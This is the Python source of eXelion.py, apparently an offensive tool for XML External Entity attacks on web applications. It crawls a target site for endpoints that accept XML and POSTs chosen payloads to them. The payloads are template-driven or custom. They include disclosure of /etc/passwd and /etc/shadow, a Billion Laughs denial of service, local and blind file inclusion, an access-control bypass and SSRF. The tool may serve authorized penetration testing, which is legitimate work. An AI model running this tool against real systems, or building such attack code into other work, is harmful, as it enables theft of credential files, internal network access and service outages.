import requests 
from argparse import ArgumentParser
from urllib.parse import urlparse
import time
from requests.structures import CaseInsensitiveDict
from colorama import Fore
import sys 
from crawlex import crawl, check_xxe  # Import the crawl and xxe check function
from templax import update_templates  # Import the String templates


#Function to convert case_insensitive_dict in string
def dict_to_str(case_insensitive_dict):
    """
    Converts a CaseInsensitiveDict to a string format.

    Parameters:
        case_insensitive_dict (CaseInsensitiveDict): The headers to convert.

    Returns:
        str: The string representation of the headers.
    """
    return '\n'.join(f'{key}: {value}' for key, value in case_insensitive_dict.items())

#Function to convert string in case_insensitive_dict
def str_to_dict(header_str):
    """
    Converts a string of headers to a CaseInsensitiveDict.

    Parameters:
        header_str (str): The string representation of headers.

    Returns:
        CaseInsensitiveDict: The headers as a CaseInsensitiveDict.
    """
    headers = CaseInsensitiveDict()
    if header_str:
        # Split the string by newlines to get each header
        pairs = header_str.splitlines()
        for pair in pairs:
            try:
                key, value = pair.split(':', 1)  # Split only at the first colon
                headers[key.strip()] = value.strip()  # Remove extra spaces
            except ValueError:
                print(f"Invalid header format: {pair}")
    return headers


def validate_arguments(argsx):
    """
    Validates command-line arguments to ensure only one special option is used and crawl options are not conflicting.

    Parameters:
        argsx (Namespace): The parsed arguments.

    Raises:
        ValueError: If more than one special option is used or if conflicting crawl options are specified.
    """
    special_options = [argsx.xxeFileDisclosure, argsx.xeeBillionLaughs, argsx.xxeLocalFileInclusion, argsx.xxeBlindLocalFileInclusion, argsx.xxeAccessControlBypass, argsx.xxeSSRF, argsx.xxe, argsx.xxefile]
    if sum(bool(opt) for opt in special_options) > 1:
        raise ValueError("Only one of the special options (-x, -xf, -xfd, -xebl, -xlfi, -xblfi, -xacb, -xs) can be used at a time.")
    
    if argsx.crawlex and argsx.crawlexverbose:
        raise ValueError("Only one of the crawl options (-cr, -crv) can be used at a time.")


def build_headers(url, custom_headers=None):
    """
    Builds the headers for the request, including the Host header based on the URL and any custom headers provided.

    Parameters:
        url (str): The target URL.
        custom_headers (str): Custom headers to include.

    Returns:
        CaseInsensitiveDict: The constructed headers.
    """
    parsed_url = urlparse(url)
    host_value = parsed_url.netloc
    standard_headers = {
        'Content-Type': 'application/xml',
        'Host': host_value
    }
    headers = CaseInsensitiveDict(standard_headers)
    if custom_headers:
        headers.update(str_to_dict(custom_headers))
    return headers

def build_body(argsx, template_s):
    """
    Constructs the request body by combining custom body data, XXE payloads, and selected templates.

    Parameters:
        argsx (Namespace): The parsed arguments.
        template_s (list): List of template payloads.

    Returns:
        str: The constructed body for the request.
    """
    bodyg = ""
    if argsx.body:
        bodyg += argsx.body + "\n"
    if argsx.xxe:
        bodyg += argsx.xxe
    if argsx.xxefile:
        with open(argsx.xxefile, 'r') as file:
            bodyg += file.read()
    if argsx.xxeFileDisclosure:
        bodyg += template_s[0]
    if argsx.xeeBillionLaughs:
        bodyg += template_s[1]
    if argsx.xxeLocalFileInclusion:
        bodyg += template_s[2]
    if argsx.xxeBlindLocalFileInclusion:
        bodyg += template_s[3]
    if argsx.xxeAccessControlBypass:
        bodyg += template_s[4]
    if argsx.xxeSSRF:
        bodyg += template_s[5]
    return bodyg

def perform_crawl(argsx, headers):
    """
    Starts a deep XML crawl for the given URL and checks for XML data transfer using XXE indicators.

    Parameters:
        argsx (Namespace): The parsed arguments.
        headers (CaseInsensitiveDict): Headers to use for requests.

    Returns:
        tuple: A tuple containing:
            - List of detected URLs with XML data transfer.
            - List of all crawled URLs.
    """
    if argsx.url:
        print(f"Starting deep XML crawler for URL: {Fore.YELLOW} {argsx.url}{Fore.RESET}...")
        xml_urls, all_urls = crawl(argsx.url, max_depth=20, headers=headers)
        print("\nChecking for XML Data transfer...")
        detected_urls = [url for url in all_urls if check_xxe(url, headers=headers, body='<?xml version="1.0">')]
        return detected_urls, all_urls  # Ensure both sets are returned
    return [], []  # Return empty lists if URL is not provided

def print_response(response):
    """
    Prints the details of the HTTP request and response.

    Parameters:
        response (Response): The HTTP response object.
    """
    print("\nRequest:\n")
    print(dict_to_str(response.request.headers) + "\n")
    print(response.request.body if response.request.body else f"{Fore.CYAN}Body is empty!!!!{Fore.RESET}")
    print("\n\nResponse:\n")
    print(dict_to_str(response.headers) + "\n")
    print(f"Body:{Fore.GREEN}\n{response.text}{Fore.RESET}")

def show_templates(template_s, templates_h):
    """
    Displays the available XXE/XEE templates.

    Parameters:
        template_s (list): List of template payloads.
        templates_h (list): List of template headers.
    """
    print(f"{Fore.YELLOW} Here are some XXE/XEE Templates payloads: {Fore.RESET}\n")
    for z, template in enumerate(template_s):
        print(templates_h[z])
        print(template)
        print("\n")

#-----------------------------------------------------------------
def main():


#Variable deklaration
  
  # variable for templates variable
  ssrfp="https://test.com"
  url_lfi = "https://example.com?page="
  filep="/etc/passwd"
  entityv = "xxe"
  proto = "file" 


  # variable to start the time
  start_t = time.time()
  
  # variable for Request XXE
  headerg = CaseInsensitiveDict()
  bodyg = ""

  # variable for crawlen
  headcrawx = CaseInsensitiveDict()
  headcrawx['Content-Type'] = 'application/xml'  
  

  #Template headers
  templates_h = ( f"{Fore.YELLOW}XXE: File Disclosure{Fore.RESET}\n", 
                  f"{Fore.YELLOW}XXE: Denial-of-Service Example{Fore.RESET}\n",
                  f"{Fore.YELLOW}XXE: Local File Inclusion{Fore.RESET}\n",
                  f"{Fore.YELLOW}XXE: Blind Local File Inclusion{Fore.RESET}\n",
                  f"{Fore.YELLOW}XXE: Access Control Bypass{Fore.RESET}\n",
                  f"{Fore.YELLOW}XXE:SSRF{Fore.RESET}\n"
                )
  # variable to change the templates
  template_s = update_templates(entityv, proto, filep, url_lfi, ssrfp)
  

#-----------------------------------------------------------------

  # Agruments Options
  parx = ArgumentParser(
  prog='eXelion.py',
  usage= '%(prog)s [options]',
  description='Tools for XXE/XEE Payloads'

  )


  groupx = parx.add_argument_group('Request options')

  # Input from user
  groupx.add_argument('-u', '--url', type=str, help='The URL target http://example.com/XML')
  groupx.add_argument('-he', '--headers', type=str, help='Use custom headers')
  groupx.add_argument('-c', '--cookie', type=str, help='Use custom cookie')
  groupx.add_argument('-b', '--body', type=str, help='Use custom body')
  groupx.add_argument('-x', '--xxe', type=str, help='Use custom XXE payload')
  groupx.add_argument('-xf', '--xxefile', help='Use custom XML file with XXE payload')


  groupx = parx.add_argument_group('Special options')

  # Extras
  groupx.add_argument('-cr', '--crawlex', action="store_true", help='search on the website for XML')
  groupx.add_argument('-crv', '--crawlexverbose', action="store_true", help='display all crawled URLs, even if no XML was found')
  groupx.add_argument('-t', '--time', action="store_true", help='give the finish time back')


  groupx = parx.add_argument_group('Templates options')

  #standard templates (https://github.com/payloadbox/xxe-injection-payload-list)
  groupx.add_argument('-st', '--showTemplates', action="store_true", help='show all availible templates')
  groupx.add_argument('-xfd', '--xxeFileDisclosure', action="store_true", help='Use a XXE template to read a file  (default value= /etc/shadow)')
  groupx.add_argument('-xebl', '--xeeBillionLaughs', action="store_true", help='Use the Billion laughs template(DoS attack)')
  groupx.add_argument('-xlfi', '--xxeLocalFileInclusion', action="store_true", help='Use a XXE template to read a file  (default value= /etc/shadow, with LFI)')
  groupx.add_argument('-xblfi', '--xxeBlindLocalFileInclusion', action="store_true", help='Use a XXE template to read a file (default value= /etc/shadow, with Blind LFI)')
  groupx.add_argument('-xacb', '--xxeAccessControlBypass', action="store_true", help='Use a XXE bypass to read a PHP file  ')
  groupx.add_argument('-xs', '--xxeSSRF', action="store_true", help='Use a XXE template with a SSRF')

  groupx = parx.add_argument_group('Variable Templates Options')

  groupx.add_argument('-vfp', '--variableFilePath', type=str, help='Variable to change the file path with the file path')
  groupx.add_argument('-ve', '--variableEntity', type=str, help='Variable to change the entity name')
  groupx.add_argument('-vp', '--variableProtocol', type=str, help='Varaible to change the protocol type')
  groupx.add_argument('-vsu', '--variableSSRF', type=str, help='Varaible to change the URL for SSRF attacks')
  groupx.add_argument('-vulfi', '--variableUrlLFI', type=str, help='Varaible to change the URL for LFI attacks')

  argsx = parx.parse_args()


  # Argumente validieren
  try:
    validate_arguments(argsx)
  except ValueError as e:
        print(f"Error: {e}")
        sys.exit(1)

  #------------------------------------------------------------------




# Header und Body anpassen
  headerg = build_headers(argsx.url, argsx.headers)
  if argsx.cookie:
        headerg.update({'Cookie': argsx.cookie})


  bodyg = build_body(argsx, template_s)

    # Templates anzeigen
  if argsx.showTemplates:
        show_templates(template_s, templates_h)
    
  
  # Crawlen und XXE-Check
  if argsx.crawlex or argsx.crawlexverbose:
      if not argsx.url:
        parx.error("The --crawlex or --crawlexverbose option requires a valid URL (-u, --url) to crawl.")
      else:
          detected_urls, all_urls = perform_crawl(argsx, headcrawx)

          if argsx.crawlexverbose:
            sorted_urls = sorted(all_urls)
            print("\nAll crawled URLs:")
            for url in sorted_urls:
              print(url)
            print("\n")

    # Anfrage ausführen
  if argsx.url:
        response = requests.post(argsx.url, headers=headerg, data=bodyg)
        print_response(response)

    # Zeit berechnen
  if argsx.time:
        end_t = time.time()
        real_t = end_t - start_t
        print("\n")
        print(f"Program duration:{Fore.YELLOW} {real_t:.2f} {Fore.RESET} seconds.")
  #------------------------------------------------------

if __name__ == "__main__":



  print(f"""
        __   __         _   _                 
        \ \ / /        | | (_)                
   ___   \ V /    ___  | |  _    ___    _ __  
  / _ \   > <    / _ \ | | | |  / _ \  | '_ \ 
 |  __/  / . \  |  __/ | | | | | (_) | | | | |
  \___| /_/ \_\  \___| |_| |_|  \___/  |_| |_|
                      
    
        
    Author:               K3res
    Github:               https://github.com/K3res/
    Check it Out!:        https://github.com/B0lg0r0v/     
                    
  """)
  main()